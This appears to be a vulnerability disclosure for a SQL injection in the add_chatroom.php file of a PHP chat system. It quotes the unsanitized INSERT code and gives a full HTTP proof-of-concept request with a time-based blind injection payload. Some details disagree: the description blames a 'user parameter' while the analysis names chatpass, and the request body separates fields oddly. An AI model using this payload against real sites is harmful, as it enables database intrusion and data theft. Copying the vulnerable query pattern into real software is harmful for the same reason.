# Chat System Using PHP has sql injection in /user/add_chatroom.php



## supplier



https://code-projects.org/chat-system-using-php-source-code/



## Vulnerability file



/user/add_chatroom.php



## describe


The user parameter in /user/add_chatroom.php is not properly sanitized or parameterized, which leaves it vulnerable to SQL injection attacks. Attackers can exploit this by injecting malicious SQL code to manipulate the database queries. Utilizing time-based SQL injection methods, they can introduce intentional delays in the database response through functions such as SLEEP(). This technique can be employed to verify the existence of the vulnerability and may also be used to extract sensitive information from the database.



## **Code analysis**



```php
<?php 
	include('session.php');
	
	if (isset($_POST['chatname'])){
	$cid="";
	$chat_name=$_POST['chatname'];
	$chat_password=$_POST['chatpass'];
	
	mysqli_query($conn,"insert into chatroom (chat_name, chat_password, date_created, userid) values ('$chat_name', '$chat_password', NOW(), '".$_SESSION['id']."')");
	$cid=mysqli_insert_id($conn);
	
	mysqli_query($conn,"insert into chat_member (chatroomid, userid) values ('$cid', '".$_SESSION['id']."')");
	
	echo $cid;
	}
	
	
?>
```

Inserting $_POST['chatpass'] into Mysql without any filter. A time-based blind SQL injection can be triggered.





## POC

```http
POST /user/add_chatroom.php?id=1 HTTP/1.1
Host: 127.0.0.1:8081
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=3d6344gkrsj651acv0qni7dk6a
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Cookie: PHPSESSID=fs4gl23e65dv8mr1vhm1jsg5ro
Content-Length: 54

chatname=1;chatpass=2' AND (SELECT 6847 FROM (SELECT(SLEEP(5)))lqtn) AND 'DdFS'='DdFS
```

Send this request, you can observe an additional 5 seconds time delay triggered by the time-based injection.

